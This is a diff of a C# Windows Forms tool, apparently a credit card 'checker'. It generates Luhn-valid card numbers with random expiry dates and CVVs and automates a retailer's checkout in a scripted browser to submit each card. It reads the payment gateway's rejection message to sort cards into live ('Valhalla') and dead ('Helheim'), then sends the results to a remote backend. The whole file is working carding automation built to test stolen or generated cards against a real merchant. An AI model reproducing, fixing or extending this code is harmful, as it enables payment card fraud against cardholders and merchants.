@@ -21,7 +21,8 @@ namespace Asgard
 {
     public partial class Odin : Form, IForm
     {
-        public new IClans Owner { get; set; }
+        public new IAesir Owner { get; set; }
+        public new IChecker OChecker { get; set; }
         //public new IHome Home { set; get; }
         //public new IChecker Checker { set; get; }
 
@@ -89,6 +90,8 @@ namespace Asgard
         SoundPlayer Valhalla;
         SoundPlayer Valkyrie;
 
+        private double OriginalCreditCardsCount;
+        private bool Stop = false;
 
         public Odin()
         {
@@ -103,11 +106,12 @@ namespace Asgard
 
         public void InitializeParameters(params object[] parameters)
         {
-            if (parameters.Length == 3)
+            if (parameters.Length == 4)
             {
                 UserId = (int)parameters[0];
                 Token = parameters[1].ToString();
                 Owner = (Aesir)parameters[2];
+                OChecker = (Checker)parameters[3];
             }
         }
 
@@ -140,7 +144,7 @@ namespace Asgard
             PanelConfirm.Hide();
             if (browser != null)
             {
-                await browser.Kill("www.brownells.com");
+                await browser.Kill(web);
             }
             this.Close();
         }
@@ -1039,6 +1043,7 @@ namespace Asgard
                 IconButtonStop.Enabled = true;
                 //running = true;
                 await UpCreditCards();
+                OriginalCreditCardsCount = CreditCards.Count;
                 await InvokeOdin();
                 await ConsoleProgressGeneral("Odin finalizo Verificación.", 100, "Success");
                 await ConsoleProgressDetail("Odin finalizo Verificación.", 100, "Success");
@@ -1085,7 +1090,7 @@ namespace Asgard
                 iconButton.Enabled = false;
 
                 await tokenCancel.Kill();
-                await browser.Kill("www.brownells.com");
+                await browser.Kill(web);
 
                 await ConsoleProgressGeneral("Odin esta siendo Detenido.", 0, "Success");
                 await ConsoleProgressDetail("Odin esta siendo Detenido.", 0, "Success");
@@ -1103,7 +1108,6 @@ namespace Asgard
                     {
                         IconButtonVerify.IconColor = Color.White;
                         IconButtonVerify.Enabled = true;
-
                     }
                     else
                     {
@@ -1112,6 +1116,7 @@ namespace Asgard
                         IconButtonVerify.Enabled = false;
                     }
                 }
+                Stop = true;
             }
             catch (Exception) { }
         }
@@ -1211,7 +1216,7 @@ namespace Asgard
                                  CreditCards[i].Add(GetDate()[0]);
                                  CreditCards[i].Add(GetDate()[1]);
                                  CreditCards[i].Add(GetCvv());
-                                 await Task.Delay(50);
+                                 //await Task.Delay(50);
                                  if (IconButtonGenerarStopClick)
                                  {
                                      IconButtonGenerarStopClick = false;
@@ -1306,11 +1311,11 @@ namespace Asgard
                 ccnumber += Math.Floor(rnd * 10);
             }
 
-            // reverse number and convert to int
+            //reverse number and convert to int
             IEnumerable<char> reversedCCnumberstring = ccnumber.ToCharArray().Reverse();
             IEnumerable<int> reversedCCnumberList = reversedCCnumberstring.Select(c => Convert.ToInt32(c.ToString()));
 
-            // calculate sum //Luhn Algorithm http://en.wikipedia.org/wiki/Luhn_algorithm
+            //calculate sum //Luhn Algorithm http://en.wikipedia.org/wiki/Luhn_algorithm
             int sum = 0;
             int pos = 0;
             int[] reversedCCnumber = reversedCCnumberList.ToArray();
@@ -1561,7 +1566,7 @@ namespace Asgard
                 iconButton.Enabled = false;
 
                 await tokenCancel.Kill();
-                await browser.Kill("www.brownells.com");
+                await browser.Kill(web);
 
                 await ConsoleProgressGeneral("Valquirias estan siendo Detenidas.", 0, "Success");
                 await ConsoleProgressDetail("Valquirias estan siendo Detenidas.", 0, "Success");
@@ -1682,7 +1687,7 @@ namespace Asgard
                         double progress = Convert.ToDouble((x + 1) * 100 / valkyriesCount);
                         await ConsoleProgressGeneral("Odin llamando a Valquirias.", (int)Math.Round(progress));
                     }
-                    await Task.Delay(50);
+                    //await Task.Delay(50);
                     x++;
 
                 }
@@ -1778,7 +1783,7 @@ namespace Asgard
                     {
                         listValkyries = string.Empty;
                     }
-                    await Task.Delay(50);
+                    //await Task.Delay(50);
                 }
                 TextBoxValkyrie.Text = listValkyries;
             }
@@ -1790,7 +1795,7 @@ namespace Asgard
 
         #region Web Browser
         #region Load Browser
-        private async Task InvokeOdin()
+        private async Task InvokeOdin(bool clearCache = true)
         {
             bool odin = false;
             try
@@ -1817,9 +1822,11 @@ namespace Asgard
             }
             catch (Exception) { }
 
-            await browser.Kill(web);
-            //await browser.Kill("www.shoebacca.com");
             await tokenCancel.Kill();
+            if (clearCache)
+            {
+                await browser.Kill(web);
+            }
 
             if (odin)
             {
@@ -1833,9 +1840,21 @@ namespace Asgard
             {
                 if (CreditCards.Count > 0)
                 {
-                    await ConsoleProgressGeneral("Odin requiere un sacrificio.", 0, "Fail");
-                    await ConsoleProgressGeneral("Ofreciendo un sacrificio a Odin.", 0, "Success");
-                    await InvokeOdin();
+                    if (!Stop)
+                    {
+                        await ConsoleProgressDetail("", 0);
+                        await ConsoleProgressGeneral("Odin requiere un sacrificio.", 0, "Fail");
+                        await ConsoleProgressGeneral("Ofreciendo un sacrificio a Odin.", 0, "Success");
+                        await InvokeOdin();
+
+                    }
+                    else
+                    {
+                        await Task.Delay(2000);
+                        await ConsoleProgressDetail("", 0);
+                        await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
+                        Stop = false;
+                    }
                 }
                 else
                 {
@@ -1843,8 +1862,8 @@ namespace Asgard
                 }
             }
             await Task.Delay(2000);
-            await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
             await ConsoleProgressDetail("", 0);
+            await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
         }
 
         private async Task<bool> LoadBrowser()
@@ -1911,16 +1930,37 @@ namespace Asgard
             }
             catch (Exception) { }
 
-            bool spanCartNumber = await browser.ElementInnerTextEquals("#root > main > header > div > div.header-desktopSecondaryActions-n-W > div:nth-child(5) > div > button > span", "1", "1.ExceptionStartOdinCart");
-            if (spanCartNumber)
+            //async Task<bool> startOdin()
+            //{
+            //    Task<bool> a = browser.ElementInnerTextEquals("#root > main > header > div > div.header-desktopSecondaryActions-n-W > div:nth-child(5) > div > button > span", "1", "1.ExceptionStartOdinCart");
+            //    Task<bool> b = browser.ElementVisible("#root > main > div:nth-child(4) > section > div > div.ais-InfiniteHits > ul > li:nth-child(1) > a", "1.ExceptionStartOdin"); ;
+
+
+            //    return startOdin(await a, await b);
+            //}
+
+            Task<bool> task1 = browser.ElementInnerTextEquals("#root > main > header > div > div.header-desktopSecondaryActions-n-W > div:nth-child(5) > div > button > span", "1", "1.ExceptionStartOdinCart", 10);
+            Task<bool> task2 = browser.ElementVisible("#root > main > div:nth-child(4) > section > div > div.ais-InfiniteHits > ul > li:nth-child(1) > a", "1.ExceptionStartOdin", 10);
+
+            await Task.WhenAll(task1, task2);
+            var task1Result = task1.Result; // or await task1
+            var task2Result = task2.Result; // or await task2
+
+            //Task<bool> task1 =browser.ElementInnerTextEquals("#root > main > header > div > div.header-desktopSecondaryActions-n-W > div:nth-child(5) > div > button > span", "1", "1.ExceptionStartOdinCart");
+            //Task<bool> task2 = browser.ElementVisible("#root > main > div:nth-child(4) > section > div > div.ais-InfiniteHits > ul > li:nth-child(1) > a", "1.ExceptionStartOdin");
+            //await Task.WhenAll(tasks); // good
+            //Task.Run(() => Task.WhenAll(a,b));
+
+            //bool spanCartNumber = await browser.ElementInnerTextEquals("#root > main > header > div > div.header-desktopSecondaryActions-n-W > div:nth-child(5) > div > button > span", "1", "1.ExceptionStartOdinCart");
+            if (task1Result)
             {
                 return await Cart();
             }
 
-            bool anchorItem = await browser.ElementVisible("#root > main > div:nth-child(4) > section > div > div.ais-InfiniteHits > ul > li:nth-child(1) > a", "1.ExceptionStartOdin");
-            if (anchorItem)
+            //bool anchorItem = await browser.ElementVisible("#root > main > div:nth-child(4) > section > div > div.ais-InfiniteHits > ul > li:nth-child(1) > a", "1.ExceptionStartOdin");
+            if (task2Result)
             {
-                await browser.Screenshot("1.Load");
+                //await browser.Screenshot("1.Load");
                 return await Item();
             }
             else
@@ -1928,7 +1968,7 @@ namespace Asgard
                 //MessageBox.Show("Recaptcha");
                 await browser.SoftKill();
                 await tokenCancel.Kill();
-                await InvokeOdin();
+                await InvokeOdin(false);
             }
 
             await ConsoleProgressGeneral("Insertando algoritmos de extensión. ¡Fallo!", 10, "Fail");
@@ -1967,7 +2007,7 @@ namespace Asgard
                     bool buttonSizeOnlySelected = await browser.ElementVisible("#productFullDetail > div.productFullDetail-options-ziU > div > div > div > button.tile-root_selected-1uw", "2.1.ExceptionItemSizeOnlySelected");
                     if (buttonSizeOnlySelected)
                     {
-                        await browser.Screenshot("2.Item");
+                        //await browser.Screenshot("2.Item");
                         return await AddToCart();
                     }
                     else
@@ -2102,7 +2142,7 @@ namespace Asgard
 
         //    try
         //    {
-        //        //await browser.Screenshot("4.AddToCart");
+        //        ////await browser.Screenshot("4.AddToCart");
         //        await ConsoleProgressGeneral("Invirtiendo escalafón profesional.", 40);
         //        await browser.DisableAlerts();
         //        string clickViewcart = @"document.querySelector('p.gritter-link.linkEase > a').click();";
@@ -2128,7 +2168,7 @@ namespace Asgard
                 await browser.Screenshot("5.Cart");
                 await ConsoleProgressGeneral("Interrelacionando distribución regular de caos.", 40);
                 await browser.DisableAlerts();
-                browser.Load($"https://{web}/cart");
+                await browser.LoadPage($"https://{web}/cart");
             }
             catch (Exception) { }
 
@@ -2259,6 +2299,7 @@ namespace Asgard
                 bool buttonSaveAndContinue = await browser.ElementVisible("#root > main > div > div > div > div.checkoutPage-checkout_information-1l2 > div.checkoutPage-shipping_information_container-1Ro > div.shippingMethod-root-1QK > form > div.shippingMethod-formButtons-tac > button", "6.ExceptionLogin", 40);
                 if (buttonSaveAndContinue)
                 {
+                    await browser.Screenshot("7.1.PaymentMethod");
                     return await SaveAndContinue();
                 }
             }
@@ -2280,25 +2321,14 @@ namespace Asgard
                     LiveCreditCards = new List<List<string>>();
                     DieCreditCards = new List<List<string>>();
                     int creditCardsCount = CreditCards.Count;
-                    int x = 0;
+                    double x = 70;
                     for (int i = 0; i < creditCardsCount;)
                     {
                         await ConsoleProgressDetail("Sintetización de la selección natural.", 0);
                         string number = CreditCards[i][0];
                         string month = CreditCards[i][1];
-                        //string month = CreditCards[i][1];
-                        //string year = CreditCards[i][2].Substring(CreditCards[i][2].Length, 1);
                         string year = CreditCards[i][2].Substring(2, 2);
                         string cvv = CreditCards[i][3];
-                        //string cvv = string.Empty;
-                        //if (CreditCards[i][3].Length == 4)
-                        //{
-                        //    cvv = "0000";
-                        //}
-                        //else
-                        //{
-                        //    cvv = "000";
-                        //}
 
                         bool card = await Card(number, month, year, cvv);
                         if (card)
@@ -2306,53 +2336,55 @@ namespace Asgard
                             bool forseti = await Forseti();
                             if (forseti)
                             {
-                                await browser.Screenshot(x.ToString() + ".Valhalla_" + number);
-                                await ConsoleProgressDetail(string.Join("|", CreditCards[i].ToArray()), 100, "Success");
+                                await browser.Screenshot("11.Valhalla_" + number);
+                                await ConsoleProgressDetail(string.Join("|", CreditCards[i].ToArray()), 100);
                                 if (TextBoxValhalla.Text == string.Empty)
                                 {
                                     listLiveCreditCard += string.Join("|", CreditCards[i].ToArray());
-                                    await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
+                                    //   await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                 }
                                 else
                                 {
                                     listLiveCreditCard = TextBoxValhalla.Text;
                                     listLiveCreditCard += "\r\n" + string.Join("|", CreditCards[i].ToArray());
-                                    await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
+                                    //    await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                 }
-                                await Task.Delay(5000);
-                                await Block();
-                                await ReduceListCreditCards();
+
+                                IEnumerable<Task> tasks = new Task[] {
+                                    Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray())),
+                                    ReduceListCreditCards(),
+                                    OChecker.SetLabelGetRunes(),
+                                    Block()
+                                };
+                                await Task.WhenAll(tasks); // good
+
                                 TextBoxValhalla.Text = listLiveCreditCard;
-                                double progress = Convert.ToDouble((x + 1) * 100 / creditCardsCount);
-                                await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(progress));
-                                await Task.Delay(50);
-                                x++;
+
+                                x += CalcIncrementX(30);
+                                await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(x));
+
                                 return false;
                             }
                             else
                             {
                                 if (!forsetiError)
                                 {
-                                    await browser.Screenshot(x.ToString() + ".Helheim_" + number);
-                                    await ConsoleProgressDetail(string.Join("|", CreditCards[i].ToArray()), 100, "Fail");
+                                    await browser.Screenshot("11.Helheim_" + number);
+                                    await ConsoleProgressDetail(string.Join("|", CreditCards[i].ToArray()), 100);
                                     if (TextBoxHelheim.Text == string.Empty)
                                     {
                                         listDieCreditCard += string.Join("|", CreditCards[i].ToArray());
-                                        await Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                     }
                                     else
                                     {
                                         listDieCreditCard = TextBoxHelheim.Text;
                                         listDieCreditCard += "\r\n" + string.Join("|", CreditCards[i].ToArray());
-                                        await Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                     }
-                                    //await Task.Run(() => home.LoadCountHelheim());
-                                    await ReduceListCreditCards();
+
+                                    await Task.WhenAll(Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray())), ReduceListCreditCards()); //good
                                     TextBoxHelheim.Text = listDieCreditCard;
-                                    double progress = Convert.ToDouble((x + 1) * 100 / creditCardsCount);
-                                    await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(progress));
-                                    await Task.Delay(50);
-                                    x++;
+                                    x += CalcIncrementX(30);
+                                    await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(x));
                                     continue;
                                 }
                                 else
@@ -2362,7 +2394,6 @@ namespace Asgard
                                 }
                             }
                         }
-                        //x++;
                     }
                 }
             }
@@ -2382,9 +2413,9 @@ namespace Asgard
             try
             {
                 await browser.Screenshot("9.Card");
-                await ConsoleProgressGeneral("Incremento de las conductas laborales.", 60);
+                await ConsoleProgressDetail("Incremento de las conductas laborales.", 60);
                 await browser.DisableAlerts();
-                await browser.ClickXY(214, 46);
+                await browser.ClickXY(200, 50);
                 await Task.Delay(500);
                 if (firstTime)
                 {
@@ -2395,31 +2426,32 @@ namespace Asgard
                 {
                     await browser.ClickXY(90, 510);
                 }
-                await Task.Delay(500);
+                //await Task.Delay(500);
                 await browser.SendKeys(string.Empty, number);
                 await browser.SendKeyCode(0x09);
-                await Task.Delay(500);
+                //await Task.Delay(500);
                 await browser.SendKeys(string.Empty, month);
                 await browser.SendKeys(string.Empty, year);
                 await browser.SendKeyCode(0x09);
-                await Task.Delay(500);
+                //await Task.Delay(500);
                 await browser.SendKeys(string.Empty, cvv);
-                await Task.Delay(500);
+                await Task.Delay(100);
                 await browser.Screenshot("9.CardFill");
                 await browser.ExecuteScript("document.querySelector('#root > main > div > div > div > div.checkoutPage-checkout_information-1l2 > div.checkoutPage-payment_information_container-3zC > form > div > div > div > div:nth-child(3) > div > div.checkoutPage-place_order_button_wrap-1qi > span > button').click()");
+                return true;
             }
             catch (Exception) { }
 
-            bool divError = await browser.ElementVisible("#root > main > div > div > div > div.checkoutPage-heading_container-3Oy > div", "6.ExceptionCard");
-            if (divError)
-            {
-                return true;
-            }
-            else
-            {
-                return true;
-            }
-            await ConsoleProgressGeneral("Incremento de las conductas laborales. ¡Fallo!", 60, "Fail");
+            //bool divError = await browser.ElementVisible("#root > main > div > div > div > div.checkoutPage-heading_container-3Oy > div", "6.ExceptionCard");
+            //if (divError)
+            //{
+            //    return true;
+            //}
+            //else
+            //{
+            //    return true;
+            //}
+            await ConsoleProgressDetail("Incremento de las conductas laborales. ¡Fallo!", 60, "Fail");
             return false;
         }
 
@@ -2430,15 +2462,25 @@ namespace Asgard
                 await browser.Screenshot("10.Forseti");
                 await ConsoleProgressDetail("Insuflando furia subatómica.", 90);
                 await browser.DisableAlerts();
-                bool valhalla = await browser.ElementInnerTextContent("#root > main > div > div > div > div.checkoutPage-heading_container-3Oy > div > span", "Gateway Rejected: cvv", "10.ExceptionValhalla");
-                if (valhalla)
+                if (await browser.ElementInnerTextNotContent("#root > main > div > div > div > div.checkoutPage-heading_container-3Oy > div > span", "oops", "10.ExceptionForseti"))
                 {
-                    return true;
+                    bool helheim = await browser.ElementInnerTextNotContent("#root > main > div > div > div > div.checkoutPage-heading_container-3Oy > div > span", "Gateway Rejected: cvv", "10.ExceptionHelheim");
+                    if (helheim)
+                    {
+                        string removeDivError = "document.querySelector('#root > main > div > div > div > div.checkoutPage-heading_container-3Oy > div > span').innerHTML='oops';";
+                        await browser.ExecuteScript(removeDivError);
+                        return false;
+                    }
+                    else
+                    {
+                        bool valhalla = await browser.ElementInnerTextContent("#root > main > div > div > div > div.checkoutPage-heading_container-3Oy > div > span", "Gateway Rejected: cvv", "10.ExceptionValhalla");
+                        if (valhalla)
+                        {
+                            return true;
+                        }
+                    }
                 }
-                else
-                {
-                    return false;
-                }
+
             }
             catch (Exception) { }
             await ConsoleProgressDetail("Insuflando furia subatómica. ¡Fallo!", 90, "Fail");
@@ -2446,30 +2488,6 @@ namespace Asgard
             return false;
         }
 
-        private async Task<bool> CorrectAddress()
-        {
-            try
-            {
-                await browser.Screenshot("6.5.CorrectAddress");
-                await ConsoleProgressGeneral("Invirtiendo escalafón profesional.", 65);
-                string clickInputRandomAddres = @"let addresses = document.querySelectorAll('input[name=qas-address]:not(#qas-address-oops)');
-                        let address = addresses[Math.floor(Math.random() * (addresses.length))];
-                        adress.click()";
-                await browser.ExecuteScript(clickInputRandomAddres);
-                await Task.Delay(1000);
-                await browser.ExecuteScript("document.querySelector('#btnQASContinue').click()");
-            }
-            catch (Exception) { }
-
-            bool inputCreditCard = await browser.ElementVisible("#txtCreditCardNumber", "6.5.ExceptionCorrectAddress");
-            if (inputCreditCard)
-            {
-                return await Last();
-            }
-
-            await ConsoleProgressGeneral("Invirtiendo escalafón profesional. ¡Fallo!", 65, "Fail");
-            return false;
-        }
         #endregion
 
         #region Methods
@@ -2497,70 +2515,30 @@ namespace Asgard
                     {
                         listCreditCard = string.Empty;
                     }
-                    await Task.Delay(100);
+                    //await Task.Delay(100);
                 }
                 TextBoxCreditCards.Text = listCreditCard;
             }
             catch (Exception) { }
         }
 
-        private async Task<bool> Payment(string number, string month, string year, string cvv)
+        private double CalcIncrementX(double value)
         {
             try
             {
-                await browser.Screenshot("8.Payment");
-
-                await ConsoleProgressDetail("Inicializando sociedades secretas.", 50);
-                await browser.DisableAlerts();
-
-                await browser.JsSendKeys("#txtCreditCardNumber", string.Empty);
-                await Task.Delay(500);
-                await browser.JsSendKeys("#txtCreditCardNumber", number);
-                await Task.Delay(500);
-                await browser.ExecuteScript($"document.querySelector('#ccExpirationMonth').selectedIndex = {month}");
-                await Task.Delay(500);
-                await browser.ExecuteScript($"document.querySelector('#ccExpirationYear').selectedIndex = {year}");
-                await Task.Delay(500);
-                await browser.JsSendKeys("#txtCVV", string.Empty);
-                await Task.Delay(500);
-                await browser.JsSendKeys("#txtCVV", cvv);
-                await Task.Delay(500);
-                //await browser.Scroll(0, 500);
-                //await browser.Scroll(200, 500);
-                await browser.JsSendKeys("#txtPhone", string.Empty);
-                await Task.Delay(500);
-                await browser.JsSendKeys("#txtPhone", Faker.Phone.PhoneNumber());
-                await Task.Delay(500);
-                await browser.ExecuteScript("document.querySelector('#btnSaveAndContinue').click()");
-
+                double x = value / OriginalCreditCardsCount;
+                return x;
             }
             catch (Exception) { }
-
-            bool buttonOk = await browser.ElementVisible("div.fancybox-wrap.fancybox-desktop.fancybox-type-html.fancybox-opened > div > div > div > div > div > div > input", "ExceptionLastButtonOk");
-            if (buttonOk)
-            {
-                return true;
-            }
-            else
-            {
-                bool spanCreditCardNumber = await browser.ElementInnerTextContent("#spnCreditCardNumber", "xxxx", "8.ExceptionLastButtonPlaceOrder");
-                if (spanCreditCardNumber)
-                {
-                    await ClickPlaceOrder();
-                    return true;
-                }
-            }
-            await ConsoleProgressDetail("Inicializando sociedades secretas.", 50, "Fail");
-            return false;
-
+            return 0;
         }
+
 
         private async Task ClickButtonOK()
         {
-
             try
             {
-                await browser.Screenshot("9.ClickButtonOK");
+                //await browser.Screenshot("9.ClickButtonOK");
                 await browser.DisableAlerts();
                 string clickOk = @"document.querySelector('div.fancybox-wrap.fancybox-desktop.fancybox-type-html.fancybox-opened > div > div > div > div > div > div > input').click();";
                 await browser.ExecuteScript(clickOk);
@@ -2572,7 +2550,7 @@ namespace Asgard
         {
             try
             {
-                await browser.Screenshot("9.ClickPlaceOrder");
+                //await browser.Screenshot("9.ClickPlaceOrder");
                 await browser.Scroll(0, 500);
                 await browser.Scroll(100, 500);
                 string buttonPlaceOrder = @"document.querySelector('#btnPlaceOrder').click();";
@@ -2588,7 +2566,7 @@ namespace Asgard
         {
             try
             {
-                await browser.Screenshot("11.EditPayment");
+                //await browser.Screenshot("11.EditPayment");
                 string clickButtonOk = @"document.querySelector('#ctl00_bodytag > div.fancybox-wrap.fancybox-desktop.fancybox-type-html.fancybox-opened > div > div > div > div > div > div > input').click();";
                 await browser.ExecuteScript(clickButtonOk);
                 await Task.Delay(1000);
@@ -2603,7 +2581,7 @@ namespace Asgard
 
         private void iconButton1_Click(object sender, EventArgs e)
         {
-            var visitor = new CookieMonster(all_cookies =>
+            CookieMonster visitor = new CookieMonster(all_cookies =>
             {
                 var sb = new StringBuilder();
                 foreach (var nameValue in all_cookies)
